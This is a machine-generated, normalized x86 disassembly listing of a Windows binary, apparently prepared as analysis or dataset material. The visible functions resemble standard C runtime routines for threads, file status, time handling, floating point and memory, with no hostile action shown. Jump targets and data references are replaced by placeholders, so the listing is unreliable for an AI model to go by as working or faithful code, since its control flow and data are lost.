mov [ eax ] 0x16
call sub_440791
add esp 0x14
or eax ebx
jmp r-xdata
mov [ esi + 0xc ] edi
mov eax ebx
push esi
call sub_444592
push esi
mov ebx eax
call sub_4452cc
push esi
call sub_444560
push eax
call sub_4451ff
add esp 0x10
test eax eax
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0x1c ]
cmp eax edi
je r-xdata
or ebx 0xffffffff
jmp r-xdata
push eax
call sub_44120e
pop ecx
mov [ esi + 0x1c ] edi
sub_44040f
push 0xc
push r--data
call sub_4433dc
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
xor edi edi
cmp esi edi
setne al
cmp eax edi
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_443b37
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push esi
call sub_443def
pop ecx
mov [ ebp - 0x4 ] edi
push esi
call sub_440398
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440483
jmp r-xdata
mov [ esi + 0xc ] edi
call sub_443421
retn
mov eax [ ebp - 0x1c ]
sub_44048b
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_445588
test eax eax
je r-xdata
push r--data
call sub_4459e0
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_44574a
pop ecx
call [ r--data ]
sub_440509
mov edi edi
push ebp
mov ebp esp
push esi
call sub_445413
call sub_44540d
push eax
call sub_4453f3
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_44561b
mov esi [ ebp + 0x8 ]
push esi
call sub_44540d
push eax
call sub_445447
test eax eax
jne r-xdata
call sub_4404c8
push r--data
call sub_4459e0
pop ecx
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_44058c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
push esi
call sub_445413
push 0x214
push 0x1
call sub_445f7b
mov esi eax
pop ecx
pop ecx
cmp esi ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
xor eax eax
jmp r-xdata
push esi
call sub_44120e
pop ecx
cmp [ ebp - 0x4 ] ebx
je r-xdata
call sub_445601
push [ eax + 0x6c ]
push esi
call sub_4454a1
mov eax [ ebp + 0x14 ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi + 0x58 ] eax
mov eax [ ebp + 0x1c ]
pop ecx
pop ecx
mov [ esi + 0x54 ] edi
cmp eax ebx
jne r-xdata
pop edi
pop ebx
leave
retn
xor eax eax
push [ ebp - 0x4 ]
call sub_443b5d
pop ecx
push eax
push [ ebp + 0x18 ]
push esi
push sub_440509
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateThread@IAT ]
cmp eax ebx
jne r-xdata
lea eax [ ebp + 0x10 ]
pop esi
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
sub_44063c
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4419ce
add esp 0x14
pop ebp
retn
sub_440669
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_443360
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_446dba
pop ecx
sub_440791
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_445378
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_446dba
pop ecx
pop ebp
jmp sub_440669
pop ebp
jmp eax
sub_4407c7
mov edi edi
push esi
call sub_446dc2
pop ecx
cmp eax 0x5
jb r-xdata
xor eax eax
retn
movzx eax [ esi ]
cmp ax 0x5c
je r-xdata
movzx eax [ esi + 0x2 ]
cmp ax 0x5c
je r-xdata
cmp ax 0x2f
jne r-xdata
movzx eax [ esi + 0x4 ]
cmp ax 0x5c
je r-xdata
cmp ax 0x2f
jne r-xdata
cmp ax 0x2f
je r-xdata
lea eax [ esi + 0x6 ]
movzx ecx [ eax ]
xor edx edx
cmp cx dx
je r-xdata
cmp cx 0x5c
je r-xdata
cmp [ eax ] dx
je r-xdata
cmp cx 0x2f
je r-xdata
add eax 0x2
cmp [ eax ] dx
je r-xdata
inc eax
inc eax
movzx ecx [ eax ]
cmp cx dx
jne r-xdata
movzx ecx [ eax ]
cmp cx dx
je r-xdata
xor eax eax
inc eax
retn
cmp cx 0x5c
je r-xdata
cmp [ eax ] dx
je r-xdata
cmp cx 0x2f
je r-xdata
cmp [ eax + 0x2 ] dx
jne r-xdata
inc eax
inc eax
movzx ecx [ eax ]
cmp cx dx
jne r-xdata
sub_440868
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_443b37
mov esi [ eax ]
call sub_443b37
push [ ebp + 0x10 ]
and [ eax ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_446ddc
add esp 0xc
mov edi eax
call sub_443b37
test edi edi
je r-xdata
cmp [ eax ] 0x22
je r-xdata
mov [ eax ] esi
mov eax edi
jmp r-xdata
call sub_443b37
push 0x0
push [ ebp + 0xc ]
mov [ eax ] esi
push 0x0
call sub_446ddc
mov ecx [ ebp + 0x14 ]
add esp 0xc
mov [ ecx ] eax
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_4408c8
mov edi edi
push ebp
mov ebp esp
sub esp 0x47c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x474 ] esi
cmp esi ebx
jne r-xdata
cmp edi ebx
je r-xdata
call sub_443b4a
mov [ eax ] ebx
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
jmp r-xdata
push r--data
push esi
call sub_4473a9
pop ecx
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
cmp [ esi + 0x2 ] 0x3a
jne r-xdata
call sub_443b37
push 0x2
pop esi
mov [ eax ] esi
call sub_443b4a
mov [ eax ] esi
jmp r-xdata
call sub_447218
movzx eax [ esi ]
cmp ax bx
je r-xdata
cmp [ ebp - 0x448 ] ebx
jne r-xdata
push r--data
push esi
mov [ ebp - 0x460 ] ebx
call sub_4473a9
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
call sub_447396
movzx eax ax
pop ecx
sub eax 0x60
jmp r-xdata
cmp [ esi + 0x4 ] bx
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x444 ] ebx
jne r-xdata
lea eax [ ebp - 0x460 ]
push eax
push 0x104
lea eax [ ebp - 0x20c ]
push esi
push eax
call sub_440868
mov esi eax
add esp 0x10
cmp esi ebx
je r-xdata
mov [ ebp - 0x47c ] eax
lea eax [ ebp - 0x45c ]
push eax
push esi
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x460 ] eax
cmp eax 0xffffffff
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_443b5d
pop ecx
push [ ebp - 0x460 ]
call [ FindClose@IAT ]
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov [ edi + 0x20 ] ebx
mov [ edi + 0x24 ] ebx
jmp r-xdata
cmp [ ebp - 0x460 ] ebx
je r-xdata
push esi
call sub_446dc2
pop ecx
cmp eax 0x3
je r-xdata
movzx eax [ ebp - 0x464 ]
push 0xffffffff
push eax
movzx eax [ ebp - 0x466 ]
push eax
movzx eax [ ebp - 0x468 ]
push eax
movzx eax [ ebp - 0x46a ]
push eax
movzx eax [ ebp - 0x46e ]
push eax
movzx eax [ ebp - 0x470 ]
push eax
call sub_446fad
add esp 0x1c
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] edx
cmp [ ebp - 0x450 ] ebx
jne r-xdata
push [ ebp - 0x460 ]
call sub_44120e
pop ecx
jmp r-xdata
push esi
call [ GetDriveTypeW@IAT ]
cmp eax 0x1
jbe r-xdata
call sub_4407c7
test eax eax
je r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x450 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x44c ] ebx
jne r-xdata
cmp [ ebp - 0x460 ] ebx
je r-xdata
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x18 ] eax
mov eax [ edi + 0x24 ]
mov [ edi + 0x1c ] eax
jmp r-xdata
push 0xffffffff
push ebx
push ebx
push ebx
push 0x1
xor eax eax
push 0x1
push 0x7bc
mov [ ebp - 0x45c ] 0x10
mov [ ebp - 0x440 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x430 ] ax
call sub_446fad
mov esi [ ebp - 0x474 ]
mov ecx edx
add esp 0x1c
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] edx
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] ecx
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] ecx
jmp r-xdata
push [ ebp - 0x460 ]
call sub_44120e
pop ecx
movzx eax [ ebp - 0x464 ]
push 0xffffffff
push eax
movzx eax [ ebp - 0x466 ]
push eax
movzx eax [ ebp - 0x468 ]
push eax
movzx eax [ ebp - 0x46a ]
push eax
movzx eax [ ebp - 0x46e ]
push eax
movzx eax [ ebp - 0x470 ]
push eax
call sub_446fad
add esp 0x1c
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] edx
cmp [ ebp - 0x458 ] ebx
jne r-xdata
push esi
push [ ebp - 0x45c ]
call sub_446eea
mov [ edi + 0x6 ] ax
xor eax eax
inc eax
mov [ edi + 0x8 ] ax
mov eax [ ebp - 0x43c ]
mov [ edi + 0x14 ] eax
xor eax eax
mov [ edi + 0x4 ] ax
mov [ edi + 0xc ] ax
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x47c ]
dec eax
pop ecx
mov [ edi ] eax
mov [ edi + 0x10 ] eax
pop ecx
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x478 ]
push eax
lea eax [ ebp - 0x458 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x454 ] ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
lea eax [ ebp - 0x470 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call [ FileTimeToSystemTime@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x28 ] eax
mov eax [ edi + 0x24 ]
mov [ edi + 0x2c ] eax
jmp r-xdata
movzx eax [ ebp - 0x464 ]
push 0xffffffff
push eax
movzx eax [ ebp - 0x466 ]
push eax
movzx eax [ ebp - 0x468 ]
push eax
movzx eax [ ebp - 0x46a ]
push eax
movzx eax [ ebp - 0x46e ]
push eax
movzx eax [ ebp - 0x470 ]
push eax
call sub_446fad
add esp 0x1c
mov [ edi + 0x28 ] eax
mov [ edi + 0x2c ] edx
push [ ebp - 0x460 ]
call [ FindClose@IAT ]
sub_440ccf
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
push 0x0
add eax 0x2ac18000
push 0x989680
adc ecx 0xfe624e21
push ecx
push eax
call sub_447650
cmp edx 0x7
jl r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
jg r-xdata
leave
retn
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
or eax 0xffffffff
mov edx eax
cmp eax 0x93406fff
jbe r-xdata
sub_440d20
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
push edi
push 0x24
push 0xff
push esi
call sub_443360
mov edi [ ebp + 0xc ]
add esp 0xc
cmp edi ebx
jne r-xdata
call sub_443b37
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
mov ecx [ edi ]
jg r-xdata
call sub_443b37
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_440791
add esp 0x14
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
mov eax esi
jmp r-xdata
call sub_447e00
lea eax [ ebp - 0x8 ]
push eax
call sub_447e90
pop ecx
test eax eax
je r-xdata
jg r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
cmp ecx ebx
jb r-xdata
pop edi
lea eax [ ebp - 0xc ]
push eax
call sub_447ec9
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
cmp ecx 0x93406fff
jbe r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_447f02
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx ebx
mov edi [ edi ]
jl r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440669
add esp 0x14
push eax
push esi
call sub_442b9f
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
jg r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
sub edi eax
lea eax [ ebp - 0x14 ]
push eax
sbb ecx edx
push esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] ecx
call sub_442b9f
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
cmp edi 0x3f480
jbe r-xdata
mov eax [ esi ]
cdq
mov edi eax
mov eax [ ebp - 0x4 ]
mov ebx edx
cdq
sub edi eax
sbb ebx edx
push esi
call sub_447e4f
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_447f60
mov edi eax
mov eax [ esi + 0x4 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x3c
adc ebx edx
push ebx
push edi
call sub_448010
mov [ esi + 0x4 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi ] eax
adc ebx 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax ecx
cdq
mov ecx eax
mov eax edx
mov [ ebp + 0x8 ] eax
mov eax [ esi ]
cdq
mov edi eax
sub edi ecx
mov ecx [ ebp + 0x8 ]
mov ebx edx
sbb ebx ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
xor eax eax
push esi
call sub_447e4f
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_447f60
mov edi eax
mov eax [ esi + 0x8 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x18
adc ebx edx
push ebx
push edi
call sub_448010
mov [ esi + 0x8 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi + 0x4 ] eax
adc ebx 0xffffffff
push 0x0
push 0x3c
push ebx
push edi
call sub_448010
mov [ esi ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0xc ]
cdq
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
sbb [ ebp - 0x10 ] edx
push esi
call sub_442b9f
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push 0x0
push 0x18
push ebx
push edi
call sub_447f60
mov ecx eax
test edx edx
jl r-xdata
add eax 0x18
add edi 0xffffffe8
mov [ esi + 0x8 ] eax
adc ebx 0xffffffff
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ esi + 0x18 ]
lea eax [ ecx + eax + 0x7 ]
cdq
push 0x7
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov eax [ esi + 0xc ]
mov [ esi + 0x18 ] edx
test eax eax
jg r-xdata
jg r-xdata
add [ esi + 0x1c ] ecx
add ecx 0x16d
add [ esi + 0x1c ] ecx
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0xb
jmp r-xdata
mov eax [ esi + 0x18 ]
add eax ecx
push 0x7
cdq
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov [ esi + 0x18 ] edx
test ecx ecx
jbe r-xdata
test edx edx
jg r-xdata
jl r-xdata
test ecx ecx
jae r-xdata
sub_440fe0
cmp [ rw-data ] 0x0
je r-xdata
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi 0xffff
push esi
push [ rw-data ]
call sub_452841
fld [ ebp + 0x8 ]
pop ecx
pop ecx
mov ecx [ ebp + 0xe ]
mov ebx eax
mov eax 0x7ff0
and ecx eax
push ecx
push ecx
fstp [ esp ]
cmp cx ax
jne r-xdata
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x1f80
cmp eax 0x1f80
jne r-xdata
call sub_4526c7
fstp [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
pop ecx
fcomp [ ebp - 0x8 ]
pop ecx
fnstsw ax
test ah 0x44
jpe r-xdata
call sub_452707
pop ecx
pop ecx
test eax eax
jle r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
test bl 0x20
jne r-xdata
push esi
push ebx
call sub_452841
fld [ ebp - 0x8 ]
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
push ebx
fadd [ r--data ]
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x8
jmp r-xdata
cmp eax 0x2
jle r-xdata
jmp r-xdata
fld [ ebp - 0x8 ]
push ebx
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0xc
push 0x10
pop esi
pop ebx
leave
retn
call sub_4525fe
add esp 0x1c
push esi
push ebx
call sub_452841
fld [ ebp + 0x8 ]
pop ecx
pop ecx
jmp r-xdata
cmp eax 0x3
jne r-xdata
movq xmm0 [ esp + 0x4 ]
movapd xmm2 [ r--data ]
movapd xmm1 xmm0
movapd xmm7 xmm0
psrlq xmm0 0x34
movd eax xmm0
andpd xmm0 [ r--data ]
psubd xmm2 xmm0
psrlq xmm1 xmm2
test eax 0x800
je r-xdata
fld [ ebp + 0x8 ]
push ebx
push ecx
push ecx
fstp [ esp ]
push 0xc
call sub_4525a9
add esp 0x10
jmp r-xdata
movq xmm0 [ esp + 0x4 ]
psllq xmm1 xmm2
movapd xmm3 xmm0
cmppd xmm0 xmm1 0x6
cmp eax 0x3ff
jl r-xdata
cmp eax 0xbff
jl r-xdata
cmppd xmm3 [ r--data ] 0x6
andpd xmm3 [ r--data ]
movq [ esp + 0x4 ] xmm3
fld [ esp + 0x4 ]
retn
cmp eax 0x432
jg r-xdata
fld [ r--data ]
retn
psllq xmm1 xmm2
cmp eax 0xc32
jg r-xdata
ucomisd xmm7 xmm7
jpo r-xdata
andpd xmm0 [ r--data ]
addsd xmm1 xmm0
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
movq [ esp + 0x4 ] xmm1
fld [ esp + 0x4 ]
retn
fld [ esp + 0x4 ]
retn
mov edx 0x3ec
sub esp 0x10
mov [ esp + 0xc ] edx
mov edx esp
add edx 0x14
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] edx
mov [ esp ] edx
call sub_4480c2
add esp 0x10
sub_441150
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_44120e
push 0xc
push r--data
call sub_4433dc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_443421
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_448919
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_443b37
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_443af5
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_441264
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_448949
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_44129c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_445378
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_445378
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_4493dd
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_4452fd
mov [ esi ] eax
add esi 0x4
push esi
call sub_4452fd
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_445fc8
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_445fc8
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_4452fd
pop ecx
mov [ rw-data ] eax
sub_441356
mov edi edi
push esi
push 0x4
push 0x20
call sub_445f7b
mov esi eax
push esi
call sub_4452fd
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_441387
push 0xc
push r--data
call sub_4433dc
call sub_445b39
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_44129c
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4413bd
mov eax [ ebp - 0x1c ]
call sub_443421
retn
sub_4413da
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_449480
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_4493dd
pop ecx
mov ebx eax
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_440791
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_443360
add esp 0xc
sub_441455
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_445601
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_44a02d
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_4498c1
mov [ esi + 0x4 ] eax
sub_4414dc
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_441455
mov eax [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov [ eax ] edi
cmp [ ebp + 0x14 ] ebx
je r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
push esi
movzx esi [ edi ]
mov [ ebp - 0x4 ] ebx
add edi 0x2
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x18 ]
push eax
push 0x8
push esi
call sub_44a27e
add esp 0xc
test eax eax
